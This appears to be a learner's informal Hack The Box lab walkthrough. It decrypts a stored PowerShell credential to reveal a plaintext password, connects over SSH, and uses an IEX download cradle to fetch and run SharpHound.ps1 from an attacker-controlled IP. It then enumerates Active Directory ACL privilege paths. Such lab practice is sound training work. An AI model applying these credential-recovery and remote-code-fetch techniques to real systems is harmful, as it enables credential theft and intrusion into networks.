
Password
```
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692
```

```
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
```

```
$user = "HTB\Tom"
```

```
$cred = New-Object System.Management.Automation.PSCredential($user,$pass)
```

```
$cred.GetNetworkCredential() | fl
```

![[Pasted image 20240510125918.png]]

```
1ts-mag1c!!!
```


Now will try to get an SSH shell
```
ssh tom@10.10.10.77
```

![[Pasted image 20240510130253.png]]

This means we have to run Bloodhound for that we have to use SharpHound.ps1
```
IWR -Uri http://10.10.16.20/SharpHound.ps1 -OutFile SharpHound.ps1
```

or
```
IEX (New-Object Net.Webclient).downloadstring("http://10.10.16.20/SharpHound.ps1")
```

Not able to run the Bloodhound from the sharp hound function will see what mistake i am doing . Refer the PDF once to see how they have run the bloodhound.
```
Invoke-BloodHound -CollectionMethod All
```

We don't have to run this as there is some problem with .net version so will simply download the acl something from the tom
https://forum.hackthebox.com/t/sharphound-ps1-doesnt-work/266964

![[Pasted image 20240510163007.png]]

Made a smb share to copy the file
![[Pasted image 20240510164619.png]]
![[Pasted image 20240510164630.png]]
![[Pasted image 20240510164644.png]]

Will filter the data and see what data or info we get out of it.
![[Pasted image 20240510165611.png]]

After adding a filter we get a objectname herman@HTB.local who has write access.
![[Pasted image 20240511021329.png]]


```
ObjectName	ObjectType	ObjectGuid	PrincipalName	PrincipalType	ActiveDirectoryRights	ACEType	AccessControlType	IsInherited

herman@HTB.LOCAL	USER		nico@HTB.LOCAL	USER	WriteOwner		AccessAllowed	False
```

And Tom has write write access onver clair
![[Pasted image 20240511021637.png]]

And if we search with a Claire than we can say that it has access to Backup_Admins@HTB_LOCAL
![[Pasted image 20240511021845.png]]


```
net groups /domain
```
![[Pasted image 20240511023040.png]]

![[Pasted image 20240511023923.png]]
